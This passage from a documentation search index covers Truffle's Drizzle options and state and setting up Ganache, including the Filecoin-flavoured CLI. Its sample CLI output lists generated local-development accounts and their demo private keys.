customProvider , fallback : { type url } } } contracts (array) \u00b6 An array of either contract artifact files or Web3 contract objects. The objects have a contractName and web3Contract key. i.e. contracts : [ truffleArtifact , // A regular Truffle contract artifact { contractName : 'RegisteredContract' , web3Contract : new web3 . eth . Contract ( abi , address , { data : 'deployedBytecode' }) // An instance of a Web3 contract } ] events (object) \u00b6 An object consisting of contract names each containing an array of strings of the event names we'd like to listen for and sync with the store. Furthermore, event names may be replaced with an object containing both eventName and eventOptions , where eventOptions field corresponds to the web3 Contract.events options . polls (object) \u00b6 An object containing key/value pairs denoting what is being polled and the interval (in ms). Possible polls are accounts and blocks. Accounts will poll for addresses and balances, blocks for new blocks. Default : { blocks: 3000 } syncAlways (boolean) \u00b6 If true , will replay all contract calls at every block. This is useful if your dapp uses a proxy contract which obfuscates your primary contract's address. By default Drizzle checks blocks to see if a transaction interacting with your contracts has occured. If so, it syncs that contract. Default : false web3 (object) \u00b6 Options regarding web3 instantiation. customProvider (object) \u00b6 A valid web3 provider object. For example, you may wish to programatically create a Ganache provider for testing: // Create a Ganache provider. const testingProvider = Ganache . provider ({ gasLimit : 7000000 }) const options = { web3 : { customProvider : testingProvider } } const drizzle = new Drizzle ( options ) fallback (object) \u00b6 An object consisting of the type and url of a fallback web3 provider. This is used if no injected provider, such as MetaMask or Mist, is detected. type (string): The type of the fallback web3 provider. Currently the only possibility is 'ws' (web socket). Default : 'ws' url (string): The full fallback web3 provider url. Default : 'ws://127.0.0.1:8545'", "title": "Drizzle Options"}, {"location": "docs/drizzle/reference/drizzle-options/#drizzle-options", "text": "{ contracts , events : { contractName : [ eventName , { eventName , eventOptions } ] }, polls : { accounts : interval , blocks : interval }, syncAlways , web3 : { customProvider , fallback : { type url } } }", "title": "Drizzle Options"}, {"location": "docs/drizzle/reference/drizzle-options/#contracts-array", "text": "An array of either contract artifact files or Web3 contract objects. The objects have a contractName and web3Contract key. i.e. contracts : [ truffleArtifact , // A regular Truffle contract artifact { contractName : 'RegisteredContract' , web3Contract : new web3 . eth . Contract ( abi , address , { data : 'deployedBytecode' }) // An instance of a Web3 contract } ]", "title": "contracts (array)"}, {"location": "docs/drizzle/reference/drizzle-options/#events-object", "text": "An object consisting of contract names each containing an array of strings of the event names we'd like to listen for and sync with the store. Furthermore, event names may be replaced with an object containing both eventName and eventOptions , where eventOptions field corresponds to the web3 Contract.events options .", "title": "events (object)"}, {"location": "docs/drizzle/reference/drizzle-options/#polls-object", "text": "An object containing key/value pairs denoting what is being polled and the interval (in ms). Possible polls are accounts and blocks. Accounts will poll for addresses and balances, blocks for new blocks. Default : { blocks: 3000 }", "title": "polls (object)"}, {"location": "docs/drizzle/reference/drizzle-options/#syncalways-boolean", "text": "If true , will replay all contract calls at every block. This is useful if your dapp uses a proxy contract which obfuscates your primary contract's address. By default Drizzle checks blocks to see if a transaction interacting with your contracts has occured. If so, it syncs that contract. Default : false", "title": "syncAlways (boolean)"}, {"location": "docs/drizzle/reference/drizzle-options/#web3-object", "text": "Options regarding web3 instantiation.", "title": "web3 (object)"}, {"location": "docs/drizzle/reference/drizzle-options/#customprovider-object", "text": "A valid web3 provider object. For example, you may wish to programatically create a Ganache provider for testing: // Create a Ganache provider. const testingProvider = Ganache . provider ({ gasLimit : 7000000 }) const options = { web3 : { customProvider : testingProvider } } const drizzle = new Drizzle ( options )", "title": "customProvider (object)"}, {"location": "docs/drizzle/reference/drizzle-options/#fallback-object", "text": "An object consisting of the type and url of a fallback web3 provider. This is used if no injected provider, such as MetaMask or Mist, is detected. type (string): The type of the fallback web3 provider. Currently the only possibility is 'ws' (web socket). Default : 'ws' url (string): The full fallback web3 provider url. Default : 'ws://127.0.0.1:8545'", "title": "fallback (object)"}, {"location": "docs/drizzle/reference/drizzle-state/", "text": "Drizzle State \u00b6 { accounts , accountBalances : { address } contracts : { contractName : { initialized , synced , events , callerFunctionName : { argsHash : { args , value } } } }, currentBlock , drizzleStatus : { initialized }, transactions : { txHash : { confirmations , error , receipt , status } }, transactionStack , web3 : { status } } accounts (array) \u00b6 An array of account addresses from web3 . accountBalances (object) \u00b6 An object whose keys are account addresses and values are account balances (in Wei). contracts (object) \u00b6 A series of contract state objects, indexed by the contract name as declared in its ABI. contractName (object) \u00b6 initialized (boolean): true once contract is fully instantiated. synced (boolean): false if contract state changes have occurred in a block and Drizzle is re-running its calls. events (array): An array of event objects. Drizzle will only listen for the events we declared in options. The contract's state also includes the state of each constant function called on the contract ( callerFunctionName ). The functions are indexed by name, and contain the outputs indexed by a hash of the arguments passed during the call ( argsHash ). If no arguments were passed, the hash is 0x0 . Drizzle reads from the store for you, so it should be unnecessary to touch this data cache manually. args (array): Arguments passed to function call. value (mixed): Value returned from function call. currentBlock (object) \u00b6 An object the latest block as an object resulting from web3.getBlock() . This is updated once the block is received from a subscription or fetched via polling, but before any processing takes place. drizzleStatus (object) \u00b6 An object containing information about the status of Drizzle. initialized (boolean): true once: * web3 is found or instantiated * Account addresses are stored in state * All contracts are instantiated initialized (boolean) \u00b6 false by default, becomes true once a web3 instance is found and the accounts and contracts are fetched. transactions (object) \u00b6 A series of transaction objects, indexed by transaction hash. txHash (object) \u00b6 confirmations (array): After the initial receipt, further confirmation receipts (up to the 24th). error (object): contains the returned error if any. receipt (object): contains the first transaction receipt received from a transaction's success event. status (string): true or false depending on transaction status * pending when the transaction has broadcasted successfully, but is not yet mined * success when a transaction receipt has been received (you may also wish to check for further confirmations) * error if any errors occurred after broadcasting For more in-depth information on the Ethereum transaction lifecycle, check out this great blog post . transactionStack (array) \u00b6 In cases where a user cancels a transaction or the transaction is malformed and unable to be broadcasted, it won't receive a hash. To keep track of these cases, a temporary ID will be added to this array and replaced with the transaction hash once broadcasted. The cacheSend() method will return a stackId , which will allow you get the temporary ID to observe this process for your own transaction status indicator UI. web3 (object) \u00b6 status (string): initializing , initialized and failed are possible options. Useful for triggering warnings if web3 fails to instantiate.", "title": "Drizzle State"}, {"location": "docs/drizzle/reference/drizzle-state/#drizzle-state", "text": "{ accounts , accountBalances : { address } contracts : { contractName : { initialized , synced , events , callerFunctionName : { argsHash : { args , value } } } }, currentBlock , drizzleStatus : { initialized }, transactions : { txHash : { confirmations , error , receipt , status } }, transactionStack , web3 : { status } }", "title": "Drizzle State"}, {"location": "docs/drizzle/reference/drizzle-state/#accounts-array", "text": "An array of account addresses from web3 .", "title": "accounts (array)"}, {"location": "docs/drizzle/reference/drizzle-state/#accountbalances-object", "text": "An object whose keys are account addresses and values are account balances (in Wei).", "title": "accountBalances (object)"}, {"location": "docs/drizzle/reference/drizzle-state/#contracts-object", "text": "A series of contract state objects, indexed by the contract name as declared in its ABI.", "title": "contracts (object)"}, {"location": "docs/drizzle/reference/drizzle-state/#contractname-object", "text": "initialized (boolean): true once contract is fully instantiated. synced (boolean): false if contract state changes have occurred in a block and Drizzle is re-running its calls. events (array): An array of event objects. Drizzle will only listen for the events we declared in options. The contract's state also includes the state of each constant function called on the contract ( callerFunctionName ). The functions are indexed by name, and contain the outputs indexed by a hash of the arguments passed during the call ( argsHash ). If no arguments were passed, the hash is 0x0 . Drizzle reads from the store for you, so it should be unnecessary to touch this data cache manually. args (array): Arguments passed to function call. value (mixed): Value returned from function call.", "title": "contractName (object)"}, {"location": "docs/drizzle/reference/drizzle-state/#currentblock-object", "text": "An object the latest block as an object resulting from web3.getBlock() . This is updated once the block is received from a subscription or fetched via polling, but before any processing takes place.", "title": "currentBlock (object)"}, {"location": "docs/drizzle/reference/drizzle-state/#drizzlestatus-object", "text": "An object containing information about the status of Drizzle. initialized (boolean): true once: * web3 is found or instantiated * Account addresses are stored in state * All contracts are instantiated", "title": "drizzleStatus (object)"}, {"location": "docs/drizzle/reference/drizzle-state/#initialized-boolean", "text": "false by default, becomes true once a web3 instance is found and the accounts and contracts are fetched.", "title": "initialized (boolean)"}, {"location": "docs/drizzle/reference/drizzle-state/#transactions-object", "text": "A series of transaction objects, indexed by transaction hash.", "title": "transactions (object)"}, {"location": "docs/drizzle/reference/drizzle-state/#txhash-object", "text": "confirmations (array): After the initial receipt, further confirmation receipts (up to the 24th). error (object): contains the returned error if any. receipt (object): contains the first transaction receipt received from a transaction's success event. status (string): true or false depending on transaction status * pending when the transaction has broadcasted successfully, but is not yet mined * success when a transaction receipt has been received (you may also wish to check for further confirmations) * error if any errors occurred after broadcasting For more in-depth information on the Ethereum transaction lifecycle, check out this great blog post .", "title": "txHash (object)"}, {"location": "docs/drizzle/reference/drizzle-state/#transactionstack-array", "text": "In cases where a user cancels a transaction or the transaction is malformed and unable to be broadcasted, it won't receive a hash. To keep track of these cases, a temporary ID will be added to this array and replaced with the transaction hash once broadcasted. The cacheSend() method will return a stackId , which will allow you get the temporary ID to observe this process for your own transaction status indicator UI.", "title": "transactionStack (array)"}, {"location": "docs/drizzle/reference/drizzle-state/#web3-object", "text": "status (string): initializing , initialized and failed are possible options. Useful for triggering warnings if web3 fails to instantiate.", "title": "web3 (object)"}, {"location": "docs/drizzle/reference/how-data-stays-fresh/", "text": "How Data Stays Fresh \u00b6 Once initialized, Drizzle instantiates web3 and our desired contracts, then observes the chain by subscribing to new block headers. Drizzle keeps track of contract calls so it knows what to synchronize. When a new block header comes in, Drizzle checks that the block isn't pending, then goes through the transactions looking to see if any of them touched our contracts. If they did, we replay the calls already in the store to refresh any potentially altered data. If they didn't we continue with the store data.", "title": "How Data Stays Fresh"}, {"location": "docs/drizzle/reference/how-data-stays-fresh/#how-data-stays-fresh", "text": "Once initialized, Drizzle instantiates web3 and our desired contracts, then observes the chain by subscribing to new block headers. Drizzle keeps track of contract calls so it knows what to synchronize. When a new block header comes in, Drizzle checks that the block isn't pending, then goes through the transactions looking to see if any of them touched our contracts. If they did, we replay the calls already in the store to refresh any potentially altered data. If they didn't we continue with the store data.", "title": "How Data Stays Fresh"}, {"location": "docs/ganache/", "text": "What is Ganache? \u00b6 Ganache is a personal blockchain for rapid Ethereum and Filecoin distributed application development. You can use Ganache across the entire development cycle; enabling you to develop, deploy, and test your dApps in a safe and deterministic environment. Ganache comes in two flavors: a UI and CLI. Ganache UI is a desktop application supporting Ethereum and Filecoin technology. Our more robust command-line tool, ganache , is available for Ethereum development. It offers: console.log in Solidity Zero-config Mainnet and testnet forking Fork any Ethereum network without waiting to sync Ethereum JSON-RPC support Snapshot/revert state Mine blocks instantly, on demand, or at an interval Fast-forward time Impersonate any account (no private keys required!) Listens for JSON-RPC 2.0 requests over HTTP/WebSockets Programmatic use in Node.js Pending Transactions Prefer using the command-line? This documentation will focus only on the UI flavor of Ganache. Please see the Ganache README for command-line documentation. You can also check out our interactive documentation if you'd like to understand how dapps communicate to nodes at the JSON-RPC level (the level at which web3.js and ethers.js communicate with Ethereum nodes). All versions of Ganache are available for Windows, Mac, and Linux.", "title": "What is Ganache?"}, {"location": "docs/ganache/#what-is-ganache", "text": "Ganache is a personal blockchain for rapid Ethereum and Filecoin distributed application development. You can use Ganache across the entire development cycle; enabling you to develop, deploy, and test your dApps in a safe and deterministic environment. Ganache comes in two flavors: a UI and CLI. Ganache UI is a desktop application supporting Ethereum and Filecoin technology. Our more robust command-line tool, ganache , is available for Ethereum development. It offers: console.log in Solidity Zero-config Mainnet and testnet forking Fork any Ethereum network without waiting to sync Ethereum JSON-RPC support Snapshot/revert state Mine blocks instantly, on demand, or at an interval Fast-forward time Impersonate any account (no private keys required!) Listens for JSON-RPC 2.0 requests over HTTP/WebSockets Programmatic use in Node.js Pending Transactions Prefer using the command-line? This documentation will focus only on the UI flavor of Ganache. Please see the Ganache README for command-line documentation. You can also check out our interactive documentation if you'd like to understand how dapps communicate to nodes at the JSON-RPC level (the level at which web3.js and ethers.js communicate with Ethereum nodes). All versions of Ganache are available for Windows, Mac, and Linux.", "title": "What is Ganache?"}, {"location": "docs/ganache/quickstart/", "text": "Ganache quickstart \u00b6 This quickstart guide will walk you through installing Ganache and creating a personal development blockchain via a quickstart workspace. If you want to use our full featured ganache CLI, see the Ganache README for installation instructions and documentation. If this isn't your first time using Ganache, or you already know you'll need custom configuration options, check out the Creating Workspaces documentation . Working with Ethereum and prefer using the command line? : This page will focus only on the graphical interface. Please see the Ganache CLI Readme for more information on the command line flavor of Ganache. 1. Install Ganache \u00b6 Download Ganache by clicking the Download button, or browse all Ganache Releases to choose the version and appropriate binary for your OS: Windows: Ganache-*.appx Mac: Ganache-*.dmg Linux: ganache-*.AppImage Next, double-click on the downloaded file, follow the prompts, and you're up and running. Note : The first time you launch Ganache, you will be asked if you want to allow Google Analytics tracking. While optional, turning this on will help the development team gain more insight into how Ganache is used. This tracking is totally anonymous, and no account data or private keys will ever be shared. 2. Create a Workspace \u00b6 When you open Ganache for the first time, you'll see the home screen. On this screen you're prompted to load an existing workspace (if any exist), create a new custom workspace, or quickstart a one-click blockchain with default options . For now, let's go with a quickstart workspace. Select the desired blockchain from the QUICKSTART drop down; you can choose to start an Ethereum node or Filecoin network, then click the QUICKSTART button. Now that you've got a workspace created, let's take a look at what you can do: Ethereum workspace overview", "title": "Quickstart"}, {"location": "docs/ganache/quickstart/#ganache-quickstart", "text": "This quickstart guide will walk you through installing Ganache and creating a personal development blockchain via a quickstart workspace. If you want to use our full featured ganache CLI, see the Ganache README for installation instructions and documentation. If this isn't your first time using Ganache, or you already know you'll need custom configuration options, check out the Creating Workspaces documentation . Working with Ethereum and prefer using the command line? : This page will focus only on the graphical interface. Please see the Ganache CLI Readme for more information on the command line flavor of Ganache.", "title": "Ganache quickstart"}, {"location": "docs/ganache/quickstart/#1-install-ganache", "text": "Download Ganache by clicking the Download button, or browse all Ganache Releases to choose the version and appropriate binary for your OS: Windows: Ganache-*.appx Mac: Ganache-*.dmg Linux: ganache-*.AppImage Next, double-click on the downloaded file, follow the prompts, and you're up and running. Note : The first time you launch Ganache, you will be asked if you want to allow Google Analytics tracking. While optional, turning this on will help the development team gain more insight into how Ganache is used. This tracking is totally anonymous, and no account data or private keys will ever be shared.", "title": "1. Install Ganache"}, {"location": "docs/ganache/quickstart/#2-create-a-workspace", "text": "When you open Ganache for the first time, you'll see the home screen. On this screen you're prompted to load an existing workspace (if any exist), create a new custom workspace, or quickstart a one-click blockchain with default options . For now, let's go with a quickstart workspace. Select the desired blockchain from the QUICKSTART drop down; you can choose to start an Ethereum node or Filecoin network, then click the QUICKSTART button. Now that you've got a workspace created, let's take a look at what you can do: Ethereum workspace overview", "title": "2. Create a Workspace"}, {"location": "docs/ganache/concepts/ethereum-workspace/contracts-page/", "text": "Contracts \u00b6 The new contracts page contains a list of your smart contracts by project. At a glance we can see the contract's name, address, transaction count, and deployment status. Clicking one of the contracts will show more details about that contract including its creation transaction, storage (state), transactions, and events.", "title": "Contracts"}, {"location": "docs/ganache/concepts/ethereum-workspace/contracts-page/#contracts", "text": "The new contracts page contains a list of your smart contracts by project. At a glance we can see the contract's name, address, transaction count, and deployment status. Clicking one of the contracts will show more details about that contract including its creation transaction, storage (state), transactions, and events.", "title": "Contracts"}, {"location": "docs/ganache/concepts/ethereum-workspace/decoded-transactions/", "text": "Transactions \u00b6 Ganache will now attempt to decode transactions that are contract calls. In addition to listing the events (encoded or not) for the transaction, Ganache will show the function signature of the transaction as well as the values of the arguments. Why aren't my transactions being decoded? Check and make sure you've added the corresponding Truffle project with the contract that the transaction is being interacted with.", "title": "Transactions"}, {"location": "docs/ganache/concepts/ethereum-workspace/decoded-transactions/#transactions", "text": "Ganache will now attempt to decode transactions that are contract calls. In addition to listing the events (encoded or not) for the transaction, Ganache will show the function signature of the transaction as well as the values of the arguments. Why aren't my transactions being decoded? Check and make sure you've added the corresponding Truffle project with the contract that the transaction is being interacted with.", "title": "Transactions"}, {"location": "docs/ganache/concepts/ethereum-workspace/events-page/", "text": "Events \u00b6 The new events page shows the events that have fired during this chain's life. We'll try to decode the events if possible. A decoded event will show its name, the emitting contract, hash of the transaction it appears in, log index, and block time. Encoded events will not display decoded names (they appear instead with the generic name Encoded Event ) or contract names. Why aren't my events being decoded? Check and make sure you've added the corresponding Truffle project with the contract that defines that event. Clicking a decoded contract will reveal more information about the event including its return values and signature.", "title": "Events"}, {"location": "docs/ganache/concepts/ethereum-workspace/events-page/#events", "text": "The new events page shows the events that have fired during this chain's life. We'll try to decode the events if possible. A decoded event will show its name, the emitting contract, hash of the transaction it appears in, log index, and block time. Encoded events will not display decoded names (they appear instead with the generic name Encoded Event ) or contract names. Why aren't my events being decoded? Check and make sure you've added the corresponding Truffle project with the contract that defines that event. Clicking a decoded contract will reveal more information about the event including its return values and signature.", "title": "Events"}, {"location": "docs/ganache/concepts/ethereum-workspace/overview/", "text": "Ethereum workspace overview \u00b6 Main interface \u00b6 Once you've created a workspace, the screen will show some details about the server, and also list out a number of accounts. Each account is given 100 ether . Having ether automatically in all accounts allows you to focus on developing your application. *Local Accounts* There are six pages available: Accounts shows the accounts generated and their balances. This is the default view. Blocks shows each block as mined on the blockchain, along with gas used and transactions. Transactions lists all transactions run against the blockchain. Contracts lists the contracts contained in your workspace's Truffle projects. For more information on how Ganache handles contracts, see our Contracts Page documentation . Events lists all events that have been triggered since this workspace's creation. Ganache will attempt to decode events triggered by contracts in your Truffle project. For more information on events, see our Events Page documentation . Logs shows the logs for the server, which is useful for debugging. Also note that you can search for block numbers or transaction hashes from a search box at the top. You're up and running! \u00b6 This guide got you started with a zero-config personal Ethereum development blockchain. If you have an existing Truffle project whose contracts and events you'd like tracked in this workspace, check out the Linking a Truffle Project documentation . If you just need to customize some options and save this workspace for later, check out the Creating Workspaces documentation .", "title": "Overview"}, {"location": "docs/ganache/concepts/ethereum-workspace/overview/#ethereum-workspace-overview", "text": "", "title": "Ethereum workspace overview"}, {"location": "docs/ganache/concepts/ethereum-workspace/overview/#main-interface", "text": "Once you've created a workspace, the screen will show some details about the server, and also list out a number of accounts. Each account is given 100 ether . Having ether automatically in all accounts allows you to focus on developing your application. *Local Accounts* There are six pages available: Accounts shows the accounts generated and their balances. This is the default view. Blocks shows each block as mined on the blockchain, along with gas used and transactions. Transactions lists all transactions run against the blockchain. Contracts lists the contracts contained in your workspace's Truffle projects. For more information on how Ganache handles contracts, see our Contracts Page documentation . Events lists all events that have been triggered since this workspace's creation. Ganache will attempt to decode events triggered by contracts in your Truffle project. For more information on events, see our Events Page documentation . Logs shows the logs for the server, which is useful for debugging. Also note that you can search for block numbers or transaction hashes from a search box at the top.", "title": "Main interface"}, {"location": "docs/ganache/concepts/ethereum-workspace/overview/#youre-up-and-running", "text": "This guide got you started with a zero-config personal Ethereum development blockchain. If you have an existing Truffle project whose contracts and events you'd like tracked in this workspace, check out the Linking a Truffle Project documentation . If you just need to customize some options and save this workspace for later, check out the Creating Workspaces documentation .", "title": "You're up and running!"}, {"location": "docs/ganache/how-to/link-a-truffle-project/", "text": "Link a Truffle project \u00b6 To link a project, enter the settings by clicking the gear icon in the upper right. You should be seeing the WORKSPACE settings pane; if not, you can get there by clicking the WORKSPACE tab in the top left. From here, there is a section labeled TRUFFLE PROJECTS . Beneath this box, click the button ADD PROJECT . A file selection popup will appear. Navigate to the folder of your Truffle project, and select the truffle-config.js or truffle.js configuration file. The file you pick must be either named truffle-config.js or truffle.js for Ganache to correctly load it. After selecting the file, you'll see it listed in the TRUFFLE PROJECTS section. You can add multiple projects to a workspace. After you're finished adding projects you can click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.", "title": "Link a Truffle project"}, {"location": "docs/ganache/how-to/link-a-truffle-project/#link-a-truffle-project", "text": "To link a project, enter the settings by clicking the gear icon in the upper right. You should be seeing the WORKSPACE settings pane; if not, you can get there by clicking the WORKSPACE tab in the top left. From here, there is a section labeled TRUFFLE PROJECTS . Beneath this box, click the button ADD PROJECT . A file selection popup will appear. Navigate to the folder of your Truffle project, and select the truffle-config.js or truffle.js configuration file. The file you pick must be either named truffle-config.js or truffle.js for Ganache to correctly load it. After selecting the file, you'll see it listed in the TRUFFLE PROJECTS section. You can add multiple projects to a workspace. After you're finished adding projects you can click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.", "title": "Link a Truffle project"}, {"location": "docs/ganache/how-to/unlink-a-truffle-project/", "text": "Unlink a Truffle project \u00b6 If you no longer want a Truffle project linked to a workspace, go to the WORKSPACE settings pane the same way you did when linking the project . To remove/unlink a Truffle project from the workspace, click on the project file in the TRUFFLE PROJECTS list and then click the REMOVE PROJECT button. When you're done, click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.", "title": "Unlink a Truffle project"}, {"location": "docs/ganache/how-to/unlink-a-truffle-project/#unlink-a-truffle-project", "text": "If you no longer want a Truffle project linked to a workspace, go to the WORKSPACE settings pane the same way you did when linking the project . To remove/unlink a Truffle project from the workspace, click on the project file in the TRUFFLE PROJECTS list and then click the REMOVE PROJECT button. When you're done, click the SAVE AND RESTART ( SAVE WORKSPACE if this is a new workspace) button in the top right.", "title": "Unlink a Truffle project"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-nodejs/", "text": "Get started with Filecoin-flavored Ganache as a NodeJS dependency \u00b6 Requirements \u00b6 Using the Filecoin-flavored Ganache NodeJS module requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version Install \u00b6 If you're using Filecoin-flavored Ganache as a NodeJS dependency, you need to make sure you install both the ganache package (with the filecoin tag) and the @ganache/filecoin package. # install the base Ganache package npm install ganache@filecoin # install the Filecoin peer dependency package npm install @ganache/filecoin Usage \u00b6 In your code, you will import / require the ganache package directly to instantiate the Filecoin flavor. Below is an example on how to do that with the default options . import Ganache from \"ganache\" ; const startupOptions = { flavor : \"filecoin\" ; } // Provider usage const provider = Ganache . provider ( startupOptions ); const result = await provider . send ({ jsonrpc : \"2.0\" , id : \"0\" , method : \"Filecoin.Version\" , params : [] }); // Server usage (starts up a HTTP and WebSocket server) const server = Ganache . server ( startupOptions ); server . listen ( 7777 , () => { console . log ( \"Lotus RPC endpoint listening at http://localhost:7777/rpc/v0\" ); }); Configuration \u00b6 See the web documentation for more details on the available NodeJS options. Like the above usage example where { flavor } was provided in startupOptions , the options in the web documentation are provide flavor . For example: { \"flavor\": \"filecoin\", \"chain\": { /* ... */ }, \"database\": { /* ... */ }, \"logging\": { /* ... */ }, \"miner\": { /* ... */ }, \"wallet\": { /* ... */ } }", "title": "Use the NodeJS library"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-nodejs/#get-started-with-filecoin-flavored-ganache-as-a-nodejs-dependency", "text": "", "title": "Get started with Filecoin-flavored Ganache as a NodeJS dependency"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-nodejs/#requirements", "text": "Using the Filecoin-flavored Ganache NodeJS module requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version", "title": "Requirements"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-nodejs/#install", "text": "If you're using Filecoin-flavored Ganache as a NodeJS dependency, you need to make sure you install both the ganache package (with the filecoin tag) and the @ganache/filecoin package. # install the base Ganache package npm install ganache@filecoin # install the Filecoin peer dependency package npm install @ganache/filecoin", "title": "Install"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-nodejs/#usage", "text": "In your code, you will import / require the ganache package directly to instantiate the Filecoin flavor. Below is an example on how to do that with the default options . import Ganache from \"ganache\" ; const startupOptions = { flavor : \"filecoin\" ; } // Provider usage const provider = Ganache . provider ( startupOptions ); const result = await provider . send ({ jsonrpc : \"2.0\" , id : \"0\" , method : \"Filecoin.Version\" , params : [] }); // Server usage (starts up a HTTP and WebSocket server) const server = Ganache . server ( startupOptions ); server . listen ( 7777 , () => { console . log ( \"Lotus RPC endpoint listening at http://localhost:7777/rpc/v0\" ); });", "title": "Usage"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-nodejs/#configuration", "text": "See the web documentation for more details on the available NodeJS options. Like the above usage example where { flavor } was provided in startupOptions , the options in the web documentation are provide flavor . For example: { \"flavor\": \"filecoin\", \"chain\": { /* ... */ }, \"database\": { /* ... */ }, \"logging\": { /* ... */ }, \"miner\": { /* ... */ }, \"wallet\": { /* ... */ } }", "title": "Configuration"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-cli/", "text": "Get started with the Filecoin-flavored Ganache CLI \u00b6 Requirements \u00b6 Filecoin-flavored Ganache CLI requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version Install \u00b6 Install the ganache package globally with the filecoin tag (note that we're not installing the old ganache-cli package) npm install --global ganache@filecoin Install the @ganache/filecoin globally npm install --global @ganache/filecoin Usage \u00b6 The CLI can be easily ran by providing the filecoin argument to the ganache executable. ganache filecoin You should presented with a screen of all of the prefunded addresses and their private keys: Ganache CLI v0.1.0 (ganache-core: 0.1.0) Starting RPC server 2021-03-16T05:07:27.175Z INFO New heaviest tipset! [bafy2bzacecsmfrjsop5d5qtmxqyqenodd52xzoe4uorqkq7537gyade5mzpui] (height=0) Available Accounts ================== (0) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga (100 FIL) (1) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q (100 FIL) (2) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq (100 FIL) (3) t3ssnxhgmcea443y6bkcjgehxzzzqly6t3nic3tttb2gka4t7blfpshjvo5dtxkhxyqygja5b2vn5evont2nda (100 FIL) (4) t3vtdookvprpwquu2g5abxsnnvvk2kzlh3uoq7cqjvmfposrozcbm6pm26xuo63wbypvbdecgyqpbxmuqpsela (100 FIL) (5) t3u6cdui7nrxjtfl2wuwt642xsqlpziqodck7ew7fllrgx4induoik4oebyftmggxrf2bcgaaei7ngnnoc744q (100 FIL) (6) t3v74brbo7e5e5nagvrbgxyccy47znpddhw2e3jzsj2zqjfe2kjnhxk32uxypdzzwpkobyzalsfhx3dfh6g4ea (100 FIL) (7) t3rjlklkxt5ikfzj2wcsukyk4makuq4eugtcnx6y3lwjrw7h7dnfi47npbklvrjbyqe3vxpacpcupukacjvd2q (100 FIL) (8) t3rihx2zizueb7n4dwmfzlsefzfnujbmjurmpsj474pip5qw2yq5migy3t5phofnicfa3bewvan5kwz3mxz7kq (100 FIL) (9) t3wxnwc7gptzjfherhrg6cavic5uc3nb34wjp5ic6comad6xfnfgalxaus7q5ml2jptf5tisuuovogxjqh4jaq (100 FIL) Private Keys ================== (0) 7add859e8942a1009bc7795f5537c6505323a62c4cfc7c27fd48602841cf6b18 (1) ab8fe5451a44b9e12f6bd8ffb1760de60e0614c3563220537e0da29e69337947 (2) e16edeaba1b619a9a8f95cf2bae80fc3532307043f323dfa34911ad8714fe39d (3) 2745fc03b31b2fb8907504b0aa00796c762a39f928260f5ba2dddccdca1933db (4) 27194755b340e21df79d5451f67f054e01a9de18036901e3be08eeb46013a5a6 (5) a51831112131f6520a647fd5a845e39e4b62c780319c7b5e929d15c407b196e6 (6) 841e0ef5e1742949c79ce8bfd42a254debad75c189e89d98292cc60092dcad50 (7) 6dcc42d3ab8e581e1841ccb1c551f3dbb95118fc61f334fba0a17f2d548fbe96 (8) 899081442676fcb592aa3fad880ca1a7a48e7f05eb1caaf16f4c455114ddf598 (9) 525053ec3d8dd48db07177fdb5988acb07749525c0269af6f50d7320c5a29d3b Lotus RPC listening on 127.0.0.1:7777 IPFS RPC listening on 127.0.0.1:5001 If you would like to use the ethereum flavor, please use the ganache-cli package . Configuration \u00b6 See available options with: ganache filecoin --help", "title": "Use the command line"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-cli/#get-started-with-the-filecoin-flavored-ganache-cli", "text": "", "title": "Get started with the Filecoin-flavored Ganache CLI"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-cli/#requirements", "text": "Filecoin-flavored Ganache CLI requires NodeJS version 12.13.0 or later. You can check your current version by running: node --version", "title": "Requirements"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-cli/#install", "text": "Install the ganache package globally with the filecoin tag (note that we're not installing the old ganache-cli package) npm install --global ganache@filecoin Install the @ganache/filecoin globally npm install --global @ganache/filecoin", "title": "Install"}, {"location": "docs/ganache/how-to/work-with-filecoin/get-started-with-the-cli/#usage", "text": "The CLI can be easily ran by providing the filecoin argument to the ganache executable. ganache filecoin You should presented with a screen of all of the prefunded addresses and their private keys: Ganache CLI v0.1.0 (ganache-core: 0.1.0) Starting RPC server 2021-03-16T05:07:27.175Z INFO New heaviest tipset! [bafy2bzacecsmfrjsop5d5qtmxqyqenodd52xzoe4uorqkq7537gyade5mzpui] (height=0) Available Accounts ================== (0) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga (100 FIL) (1) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q (100 FIL) (2) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq (100 FIL) (3) t3ssnxhgmcea443y6bkcjgehxzzzqly6t3nic3tttb2gka4t7blfpshjvo5dtxkhxyqygja5b2vn5evont2nda (100 FIL) (4) t3vtdookvprpwquu2g5abxsnnvvk2kzlh3uoq7cqjvmfposrozcbm6pm26xuo63wbypvbdecgyqpbxmuqpsela (100 FIL) (5) t3u6cdui7nrxjtfl2wuwt642xsqlpziqodck7ew7fllrgx4induoik4oebyftmggxrf2bcgaaei7ngnnoc744q (100 FIL) (6) 